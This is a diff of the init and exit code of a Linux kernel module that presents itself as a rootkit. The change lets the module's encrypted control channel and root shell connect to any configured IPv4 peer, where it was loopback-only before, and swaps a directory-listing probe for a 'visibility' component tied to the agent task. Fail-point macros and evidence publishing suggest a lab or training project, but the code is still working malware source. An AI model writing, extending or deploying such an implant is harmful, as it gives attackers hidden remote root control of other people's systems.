@@ -3,27 +3,34 @@
 #include <linux/errno.h>
 #include <linux/init.h>
 #include <linux/module.h>
-#include <linux/random.h>
 #include <linux/string.h>
 
 #include "aead.h"
 #include "agent.h"
 #include "agent_status.h"
+#include "ipv4.h"
 #include "packet_redirect.h"
 #include "platform.h"
+#include "provision.h"
 #include "root_shell.h"
 #include "rootkit.h"
 #include "transaction.h"
+#include "visibility.h"
 
 #define RK_FAIL_PACKET_REDIRECT 14
 
-#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 14
+#if ROOTKITLINGS_FAIL_POINT < 0 || ROOTKITLINGS_FAIL_POINT > 15
 #error "unknown ROOTKITLINGS_FAIL_POINT"
 #endif
 
 static unsigned short peer_port;
 module_param(peer_port, ushort, 0400);
-MODULE_PARM_DESC(peer_port, "loopback TCP listener port");
+MODULE_PARM_DESC(peer_port, "control TCP listener port");
+
+static char peer_address_text[16] = "127.0.0.1";
+module_param_string(peer_address, peer_address_text,
+		    sizeof(peer_address_text), 0400);
+MODULE_PARM_DESC(peer_address, "control and shell IPv4 peer address");
 
 static unsigned int retry_base_ms = 25;
 module_param(retry_base_ms, uint, 0400);
@@ -41,10 +48,6 @@ static char control_key_hex[RK_AEAD_KEY_LENGTH * 2 + 1];
 module_param_string(control_key, control_key_hex,
 		    sizeof(control_key_hex), 0000);
 MODULE_PARM_DESC(control_key, "64 hexadecimal control-key digits");
-
-static unsigned long long session_id;
-module_param(session_id, ullong, 0000);
-MODULE_PARM_DESC(session_id, "test-only fixed control session");
 
 static unsigned short redirect_from_port = 5400;
 module_param(redirect_from_port, ushort, 0400);
@@ -65,50 +68,6 @@ static bool rk_packet_actions_enabled(void *context)
 	return rk_state_actions_enabled(context);
 }
 
-static int rk_hex_nibble(char character, u8 *nibble)
-{
-	if (character >= '0' && character <= '9')
-		*nibble = character - '0';
-	else if (character >= 'a' && character <= 'f')
-		*nibble = character - 'a' + 10;
-	else if (character >= 'A' && character <= 'F')
-		*nibble = character - 'A' + 10;
-	else
-		return -EINVAL;
-	return 0;
-}
-
-static int rk_parse_control_key(u8 key[RK_AEAD_KEY_LENGTH])
-{
-	struct {
-		u8 bytes[RK_AEAD_KEY_LENGTH];
-	} candidate = { };
-	size_t index;
-	bool any_nonzero = false;
-	int error = -EINVAL;
-
-	if (strlen(control_key_hex) != RK_AEAD_KEY_LENGTH * 2)
-		goto out;
-	for (index = 0; index < RK_AEAD_KEY_LENGTH; index++) {
-		u8 high;
-		u8 low;
-
-		if (rk_hex_nibble(control_key_hex[index * 2], &high) ||
-		    rk_hex_nibble(control_key_hex[index * 2 + 1], &low))
-			goto out;
-		candidate.bytes[index] = (high << 4) | low;
-		any_nonzero |= candidate.bytes[index] != 0;
-	}
-	if (!any_nonzero)
-		goto out;
-	memcpy(key, candidate.bytes, sizeof(candidate.bytes));
-	error = 0;
-out:
-	memzero_explicit(&candidate, sizeof(candidate));
-	memzero_explicit(control_key_hex, sizeof(control_key_hex));
-	return error;
-}
-
 static int __init rk_init(void)
 {
 	struct rk_netfilter_config redirect_config = {
@@ -120,15 +79,16 @@ static int __init rk_init(void)
 			-EINTR : 0,
 	};
 	u8 control_key[RK_AEAD_KEY_LENGTH] = { };
-	u64 session;
+	__be32 peer_address;
 	int error;
 
-	session = session_id;
-	session_id = 0;
-	error = rk_parse_control_key(control_key);
+	error = rk_control_key_parse_and_clear(
+		control_key_hex, sizeof(control_key_hex), control_key);
 	if (error)
 		return error;
-	if (!peer_port || !retry_base_ms || retry_base_ms > retry_max_ms ||
+	error = rk_ipv4_parse(peer_address_text, &peer_address);
+	if (error || !peer_port || !retry_base_ms ||
+	    retry_base_ms > retry_max_ms ||
 	    retry_max_ms > 5000 || !redirect_from_port || !redirect_to_port ||
 	    redirect_from_port == redirect_to_port) {
 		error = -EINVAL;
@@ -138,11 +98,6 @@ static int __init rk_init(void)
 		error = -ECANCELED;
 		goto clear_key;
 	}
-	if (!session)
-		do {
-			session = get_random_u64();
-		} while (!session);
-
 	state = rk_state_create();
 	if (IS_ERR(state)) {
 		error = PTR_ERR(state);
@@ -161,12 +116,9 @@ static int __init rk_init(void)
 	error = rk_return_probe_start(state);
 	if (error)
 		goto stop_authorization;
-	error = rk_getdents_probe_start(state);
-	if (error)
-		goto stop_return_probe;
 	error = rk_platform_prepare();
 	if (error)
-		goto stop_getdents_probe;
+		goto stop_return_probe;
 	error = rk_transaction_apply(&transaction);
 	if (error)
 		goto finish_platform;
@@ -176,16 +128,19 @@ static int __init rk_init(void)
 	if (ROOTKITLINGS_FAIL_POINT == RK_FAIL_AGENT_WORKER)
 		error = -EINTR;
 	else
-		error = rk_agent_start(&agent, peer_port, retry_base_ms,
-				       retry_max_ms, control_key,
-				       sizeof(control_key), session, state,
+		error = rk_agent_start(&agent, peer_address, peer_port,
+				       retry_base_ms, retry_max_ms,
+				       control_key, sizeof(control_key), state,
 				       &root_shell);
 	memzero_explicit(control_key, sizeof(control_key));
 	if (error)
 		goto stop_root_shell;
-	error = rk_events_publish();
+	error = rk_visibility_start(state, agent.task);
 	if (error)
 		goto stop_agent;
+	error = rk_events_publish();
+	if (error)
+		goto stop_visibility;
 	error = rk_evidence_publish();
 	if (error)
 		goto unpublish_events;
@@ -212,6 +167,8 @@ unpublish_evidence:
 	rk_evidence_unpublish();
 unpublish_events:
 	rk_events_unpublish();
+stop_visibility:
+	rk_visibility_stop();
 stop_agent:
 	rk_agent_stop(&agent);
 stop_root_shell:
@@ -221,8 +178,6 @@ restore_transaction:
 	rk_transaction_dispose(&transaction);
 finish_platform:
 	rk_platform_finish();
-stop_getdents_probe:
-	rk_getdents_probe_stop();
 stop_return_probe:
 	rk_return_probe_stop();
 stop_authorization:
@@ -247,10 +202,10 @@ static void __exit rk_exit(void)
 	rk_agent_status_unpublish();
 	rk_evidence_unpublish();
 	rk_events_unpublish();
+	rk_visibility_stop();
 	(void)rk_transaction_restore(&transaction);
 	rk_transaction_dispose(&transaction);
 	rk_platform_finish();
-	rk_getdents_probe_stop();
 	rk_return_probe_stop();
 	rk_authorization_stop();
 	rk_worker_stop();
